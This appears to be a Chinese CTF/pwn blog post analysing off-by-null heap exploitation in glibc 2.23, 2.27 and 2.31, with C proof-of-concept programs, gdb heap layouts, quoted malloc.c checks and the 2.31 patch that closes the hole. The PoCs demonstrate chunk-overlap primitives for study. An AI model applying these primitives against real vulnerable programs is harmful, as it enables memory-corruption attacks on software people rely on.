---
title: off_by_null源码分析
date: 2021-08-28 18:39:44
tags:
    - pwn
    - 源码分析
    - how2heap
    - off_by_null
categories:
    - pwn
---


### 2.23

#### 一种利用方式

```c
#include <stdio.h>
#include <stdlib.h>

typedef unsigned char u8;
typedef unsigned int  u32;

int main()
{
	u8 *b1, *b2;
	u8 *A, *B, *C;
	
	A = malloc(0x18); 
	B = malloc(0x100); 
	C = malloc(0x100);
	malloc(0);             //barriar

	*(u32*)(B+0xf0) = 0x100;
	free(B);

	A[0x18] = '\x00';      // off by null

	b1 = malloc(0x88);
	b2 = malloc(0x18);	

	free(b1);
	free(C);               //trigger
	return 0;
}
```

* heap layout

```c
# A
0x55555555b000  0x0000000000000000      0x0000000000000021 
0x55555555b010  0x0000000000000000      0x0000000000000000 
# B (b1)
0x55555555b020  0x0000000000000000      0x0000000000000221          <-- unsortedbin[all][0]
0x55555555b030  0x000055555555b0d0      0x00007ffff7dd1b78 
0x55555555b040  0x0000000000000000      0x0000000000000000 
0x55555555b050  0x0000000000000000      0x0000000000000000 
0x55555555b060  0x0000000000000000      0x0000000000000000 
0x55555555b070  0x0000000000000000      0x0000000000000000 
0x55555555b080  0x0000000000000000      0x0000000000000000 
0x55555555b090  0x0000000000000000      0x0000000000000000 
0x55555555b0a0  0x0000000000000000      0x0000000000000000 
# b2
0x55555555b0b0  0x0000000000000090      0x0000000000000020 
0x55555555b0c0  0x00007ffff7dd1b78      0x00007ffff7dd1b78 
# rest in unsorted bin
0x55555555b0d0  0x0000000000000000      0x0000000000000051          <-- unsortedbin[all][1]
0x55555555b0e0  0x00007ffff7dd1b78      0x000055555555b020 
0x55555555b0f0  0x0000000000000000      0x0000000000000000 
0x55555555b100  0x0000000000000000      0x0000000000000000 
0x55555555b110  0x0000000000000000      0x0000000000000000 
0x55555555b120  0x0000000000000050      0x0000000000000000 
# C
0x55555555b130  0x0000000000000110      0x0000000000000110 
0x55555555b140  0x0000000000000000      0x0000000000000000 
0x55555555b150  0x0000000000000000      0x0000000000000000 
0x55555555b160  0x0000000000000000      0x0000000000000000 
0x55555555b170  0x0000000000000000      0x0000000000000000 
0x55555555b180  0x0000000000000000      0x0000000000000000 
0x55555555b190  0x0000000000000000      0x0000000000000000 
0x55555555b1a0  0x0000000000000000      0x0000000000000000 
0x55555555b1b0  0x0000000000000000      0x0000000000000000 
0x55555555b1c0  0x0000000000000000      0x0000000000000000 
0x55555555b1d0  0x0000000000000000      0x0000000000000000 
0x55555555b1e0  0x0000000000000000      0x0000000000000000 
0x55555555b1f0  0x0000000000000000      0x0000000000000000 
0x55555555b200  0x0000000000000000      0x0000000000000000 
0x55555555b210  0x0000000000000000      0x0000000000000000 
0x55555555b220  0x0000000000000000      0x0000000000000000 
0x55555555b230  0x0000000000000000      0x0000000000000000 
# barrier
0x55555555b240  0x0000000000000220      0x0000000000000020 
0x55555555b250  0x0000000000000000      0x0000000000000000 
0x55555555b260  0x0000000000000000      0x0000000000020da1          <-- Top chunk
```
* 看b1,b2。其中申请了b1之后就又free.这是为了使b1要在双向链表中(这个是unsorted bin)，以便free(C);时“向前“合并，也即是将b1unlink出来
* 看malloc(0x18);，从unsorted bin分割出来之后剩余的部分不会放到相应的bin中，依旧会停留在unsorted bin中因为其是从remainder中分割，直接返回。
* 在比赛中未必会让分割比较大的块,但是编辑的内容要覆盖B[0xf0] - B[0xf8]

#### 另一种利用方式
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

typedef unsigned char u8;
typedef unsigned int  u32;
typedef unsigned long u64;

int main()
{
	u8 *b1, *b2;
	u8 *A, *B, *C;
	A = malloc(0x100); 
	B = malloc(0x18); 
	C = malloc(0x100);
	malloc(0);          //barriar

	free(A);            //to get a freed chunk in unsorted bins
	
	*(u32*)(B+0x10) = 0x130;
	B[0x18] = '\x00';   //off by null
	*(u32*)(C+0xf8) = 0x31;
	
	free(C);            // consolidate backward
	return 0;
}
```

* layout

```c
A
0x55555555b000  0x0000000000000000      0x0000000000000111          <-- unsortedbin[all][0]
0x55555555b010  0x00007ffff7dd1b78      0x00007ffff7dd1b78 
0x55555555b020  0x0000000000000000      0x0000000000000000 
0x55555555b030  0x0000000000000000      0x0000000000000000 
0x55555555b040  0x0000000000000000      0x0000000000000000 
0x55555555b050  0x0000000000000000      0x0000000000000000 
0x55555555b060  0x0000000000000000      0x0000000000000000 
0x55555555b070  0x0000000000000000      0x0000000000000000 
0x55555555b080  0x0000000000000000      0x0000000000000000 
0x55555555b090  0x0000000000000000      0x0000000000000000 
0x55555555b0a0  0x0000000000000000      0x0000000000000000 
0x55555555b0b0  0x0000000000000000      0x0000000000000000 
0x55555555b0c0  0x0000000000000000      0x0000000000000000 
0x55555555b0d0  0x0000000000000000      0x0000000000000000 
0x55555555b0e0  0x0000000000000000      0x0000000000000000 
0x55555555b0f0  0x0000000000000000      0x0000000000000000 
0x55555555b100  0x0000000000000000      0x0000000000000000
# B 
0x55555555b110  0x0000000000000110      0x0000000000000020 
0x55555555b120  0x0000000000000000      0x0000000000000000 
# C
0x55555555b130  0x0000000000000130      0x0000000000000100 
0x55555555b140  0x0000000000000000      0x0000000000000000 
0x55555555b150  0x0000000000000000      0x0000000000000000 
0x55555555b160  0x0000000000000000      0x0000000000000000 
0x55555555b170  0x0000000000000000      0x0000000000000000 
0x55555555b180  0x0000000000000000      0x0000000000000000 
0x55555555b190  0x0000000000000000      0x0000000000000000 
0x55555555b1a0  0x0000000000000000      0x0000000000000000 
0x55555555b1b0  0x0000000000000000      0x0000000000000000 
0x55555555b1c0  0x0000000000000000      0x0000000000000000 
0x55555555b1d0  0x0000000000000000      0x0000000000000000 
0x55555555b1e0  0x0000000000000000      0x0000000000000000 
0x55555555b1f0  0x0000000000000000      0x0000000000000000 
0x55555555b200  0x0000000000000000      0x0000000000000000 
0x55555555b210  0x0000000000000000      0x0000000000000000 
0x55555555b220  0x0000000000000000      0x0000000000000000 
0x55555555b230  0x0000000000000000      0x00000000000000[31] // to offset the lose of B's size 
# barrier
0x55555555b240  0x0000000000000000      0x0000000000000021 
0x55555555b250  0x0000000000000000      0x0000000000000000 
0x55555555b260  0x0000000000000000      0x0000000000020da1          <-- Top chunk
```

* `free(A);`这一行直接创造了一个在双向链表中的的`freed chunk`
* `*(uint64_t*)(C+0xf8) = 0x31;`这一句呢是为了绕过对next_chunk的检查

```c
#define SIZE_SZ 0x8
// av->system_mem = 0x21000

    nextchunk = chunk_at_offset(p, size);
    ...
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      {
        errstr = "double free or corruption (!prev)";
        goto errout;
      }
    nextsize = chunksize(nextchunk);
    if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
      	|| __builtin_expect (nextsize >= av->system_mem, 0))
      {
        errstr = "free(): invalid next size (normal)";
        goto errout;
      }
```
* 这种方式会有一种特殊的情况,当`C = malloc(0xf8)`,size 刚好为`0x101`,off by null时只改变了pre_in_use位,没有改变size,也就也就无需`*(uint64_t*)(C+0xf8) = 0x31;`的绕过

### 2.27

> 整体上来说，与2.23差别不大，2.27只需要先将对应的tcache填满。写2.23的方法时已经做了多余的铺垫。以下两种方式也是对上边的模仿。

#### exp1

```c
#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

typedef unsigned char u8;
typedef unsigned int  u32;

int main()
{
	u8 *A, *B, *C;
	u8 *b1, *b2, *barrier;
	u8 *list[0x7], *list2[0x7];

	for(int i=0;i<7;i++) {
		list2[i] = malloc(0x88);
	}
	for(int i=0;i<7;i++) {
		list[i] = malloc(0x100);
	}

	A = malloc(0x18);
	B = malloc(0x100);
	C = malloc(0x100);
	barrier = malloc(0x0);

	*(u64*)(B+0xf0) = 0x100;
	for(int i=0;i<7;i++) {
		free(list[i]);
	}
	free(B);
	
	A[0x18] = 0x00; // off by null

	b1 = malloc(0x88);
	b2 = malloc(0x18);

	for(int i=0;i<7;i++) {
		free(list2[i]);
	}
	free(b1); 
	
	free(C);        // trigger
	return 0;
}
```

* 进行一些源码分析

free C之后经过这一步

```c
  /*
    Consolidate other non-mmapped chunks as they arrive.
  */

  else if (!chunk_is_mmapped(p)) {

    /* If we're single-threaded, don't lock the arena.  */
    if (SINGLE_THREAD_P)
      have_lock = true;

    if (!have_lock)
      __libc_lock_lock (av->mutex);

    nextchunk = chunk_at_offset(p, size);

    /* Lightweight tests: check whether the block is already the
       top block.  */
    if (__glibc_unlikely (p == av->top))
      malloc_printerr ("double free or corruption (top)");
    /* Or whether the next chunk is beyond the boundaries of the arena.  */
    if (__builtin_expect (contiguous (av)
			  && (char *) nextchunk
			  >= ((char *) av->top + chunksize(av->top)), 0))
	malloc_printerr ("double free or corruption (out)");
    /* Or whether the block is actually not marked used.  */
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      malloc_printerr ("double free or corruption (!prev)");

    nextsize = chunksize(nextchunk);
    if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (nextsize >= av->system_mem, 0))
      malloc_printerr ("free(): invalid next size (normal)");

    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);

    /* consolidate backward */
    if (!prev_inuse(p)) {                        // C的prev_inuse在free(B)时清除掉
      prevsize = prev_size (p);                  // C的prevsize也是在free(B)时写入的
      size += prevsize;                          // 这里的size是 C+B的
      p = chunk_at_offset(p, -((long) prevsize));// 找到原始的B块，亦现在的b1块
      unlink(av, p, bck, fwd);                   // 将b1从双向链表中脱出
    }

    if (nextchunk != av->top) {                  // barrier的作用
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
	unlink(av, nextchunk, bck, fwd);
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0);

      /*
	Place the chunk in unsorted chunk list. Chunks are
	not placed into regular bins until after they have
	been given one chance to be used in malloc.
      */

      bck = unsorted_chunks(av);                           // 这部分是将其加入unsorted bin 入链
      fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
	malloc_printerr ("free(): corrupted unsorted chunks");
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
	{
	  p->fd_nextsize = NULL;
	  p->bk_nextsize = NULL;
	}
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);                     // 写入 consolidate size
      set_foot(p, size);

      check_free_chunk(av, p);
    }
```

上部脱出b1块时`(chunksize(P) != prev_size (next_chunk(P)`,即`chunksize(b1)== prev_size(b2)`,是完全符合的

```c
#define next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)->size & ~SIZE_BITS)))

/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
//-------------------------check--------------------------------------
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
//-------------------------check-------------------------------------
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");			      \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (chunksize_nomask (P))			      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```
```shell
# b1
0x55555555bdd0: 0x0000000000000000      0x0000000000000091
0x55555555bde0: 0x000055555555be80      0x00007ffff7dcdca0
0x55555555bdf0: 0x0000000000000000      0x0000000000000000
0x55555555be00: 0x0000000000000000      0x0000000000000000
0x55555555be10: 0x0000000000000000      0x0000000000000000
0x55555555be20: 0x0000000000000000      0x0000000000000000
0x55555555be30: 0x0000000000000000      0x0000000000000000
0x55555555be40: 0x0000000000000000      0x0000000000000000
0x55555555be50: 0x0000000000000000      0x0000000000000000
# b2
0x55555555be60: 0x0000000000000090      0x0000000000000020
0x55555555be70: 0x00007ffff7dcdca0      0x00007ffff7dcdca0
# rest unsorted bin
0x55555555be80: 0x0000000000000000      0x0000000000000051
0x55555555be90: 0x00007ffff7dcdca0      0x000055555555bdd0
0x55555555bea0: 0x0000000000000000      0x0000000000000000
0x55555555beb0: 0x0000000000000000      0x0000000000000000
0x55555555bec0: 0x0000000000000000      0x0000000000000000
0x55555555bed0: 0x0000000000000050      0x0000000000000000
# C
0x55555555bee0: 0x0000000000000110      0x0000000000000110
0x55555555bef0: 0x0000000000000000      0x0000000000000000
0x55555555bf00: 0x0000000000000000      0x0000000000000000
```

* 在check中P即是b1块,他是通过b1的size来验证完整性的，下边有b2是满足的

* 问题的关键在*consolidate backward*中，unlink之前没有验证其完整性
```c
/* consolidate backward */
if (!prev_inuse(p)) {
	prevsize = prev_size (p);
	// asser(prev_size(p) == prev_chunk_size(p));
	size += prevsize;
	p = chunk_at_offset(p, -((long) prevsize));
	unlink(av, p, bck, fwd);
}
```
加这句话就可以patch掉这种利用手法。事实上2.31就是类似patch的。

#### 直接利用0x101覆盖成0x100

这种是更加可行的方式
```c
#include <stdio.h>
#include <stdlib.h>

typedef unsigned char u8;
typedef unsigned int u32;

int main()
{
	u8 *list[0x7];
	u8 *A, *B, *C;

	A = malloc(0xf8);
	B = malloc(0x18);
	C = malloc(0xf8);
	
	for(int i=0;i<7;i++) {
		list[i] = malloc(0xf8);
	}
	for(int i=0;i<7;i++) {
		free(list[i]);
	}

	free(A);
	*(u32*)(B+0x10) = 0x100+0x20; // forge C's prvesize
	B[0x18] = '\x00';             // off by null
  	
	free(C);
	return 0;
}
```
* layout

```shell
# A
0x55555555b950  0x0000000000000000      0x0000000000000221           <-- unsortedbin[all][0]
0x55555555b960  0x00007ffff7dcdca0      0x00007ffff7dcdca0  
0x55555555b970  0x0000000000000000      0x0000000000000000  
0x55555555b980  0x0000000000000000      0x0000000000000000  
0x55555555b990  0x0000000000000000      0x0000000000000000  
0x55555555b9a0  0x0000000000000000      0x0000000000000000  
0x55555555b9b0  0x0000000000000000      0x0000000000000000  
0x55555555b9c0  0x0000000000000000      0x0000000000000000  
0x55555555b9d0  0x0000000000000000      0x0000000000000000  
0x55555555b9e0  0x0000000000000000      0x0000000000000000  
0x55555555b9f0  0x0000000000000000      0x0000000000000000  
0x55555555ba00  0x0000000000000000      0x0000000000000000  
0x55555555ba10  0x0000000000000000      0x0000000000000000  
0x55555555ba20  0x0000000000000000      0x0000000000000000  
0x55555555ba30  0x0000000000000000      0x0000000000000000  
0x55555555ba40  0x0000000000000000      0x0000000000000000  
# B
0x55555555ba50  0x0000000000000100      0x0000000000000020  
0x55555555ba60  0x0000000000000000      0x0000000000000000  
#C
0x55555555ba70  0x0000000000000120      0x00000000000001[00]
0x55555555ba80  0x0000000000000000      0x0000000000000000  
0x55555555ba90  0x0000000000000000      0x0000000000000000  
0x55555555baa0  0x0000000000000000      0x0000000000000000  
0x55555555bab0  0x0000000000000000      0x0000000000000000  
0x55555555bac0  0x0000000000000000      0x0000000000000000  
0x55555555bad0  0x0000000000000000      0x0000000000000000  
0x55555555bae0  0x0000000000000000      0x0000000000000000  
0x55555555baf0  0x0000000000000000      0x0000000000000000  
0x55555555bb00  0x0000000000000000      0x0000000000000000  
0x55555555bb10  0x0000000000000000      0x0000000000000000  
0x55555555bb20  0x0000000000000000      0x0000000000000000  
0x55555555bb30  0x0000000000000000      0x0000000000000000  
0x55555555bb40  0x0000000000000000      0x0000000000000000  
0x55555555bb50  0x0000000000000000      0x0000000000000000  
0x55555555bb60  0x0000000000000000      0x0000000000000000  
#barrier
0x55555555bb70  0x0000000000000220      0x0000000000000020  
0x55555555bb80  0x0000000000000000      0x0000000000000000  
0x55555555bb90  0x0000000000000000      0x0000000000020471           <-- Top chunk

```

写题时还发现这个检查
```c
    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
	unlink(av, nextchunk, bck, fwd);
	size += nextsize;
      } else
	clear_inuse_bit_at_offset(nextchunk, 0);
```
所以要先`free(A)` 后`off by null`，不然会检验C的下一个chunk的`pre_inuse`,当然也可中间做个铺垫。

### 2.31

* [diff](https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f)
* [src](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4331)

```c
...
/* consolidate backward */
if (!prev_inuse(p)) {
	prevsize = prev_size (p);
	size += prevsize;
	p = chunk_at_offset(p, -((long) prevsize));
	if (__glibc_unlikely (chunksize(p) != prevsize))
	malloc_printerr ("corrupted size vs. prev_size while consolidating");
	unlink_chunk (av, p);
}
...

/* Take a chunk off a bin list.  */
static void
unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");

  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;

  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");

  fd->bk = bk;
  bk->fd = fd;
  if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
    {
      if (p->fd_nextsize->bk_nextsize != p
	  || p->bk_nextsize->fd_nextsize != p)
	malloc_printerr ("corrupted double-linked list (not small)");

      if (fd->fd_nextsize == NULL)
	{
	  if (p->fd_nextsize == p)
	    fd->fd_nextsize = fd->bk_nextsize = fd;
	  else
	    {
	      fd->fd_nextsize = p->fd_nextsize;
	      fd->bk_nextsize = p->bk_nextsize;
	      p->fd_nextsize->bk_nextsize = fd;
	      p->bk_nextsize->fd_nextsize = fd;
	    }
	}
      else
	{
	  p->fd_nextsize->bk_nextsize = p->bk_nextsize;
	  p->bk_nextsize->fd_nextsize = p->fd_nextsize;
	}
    }
}
```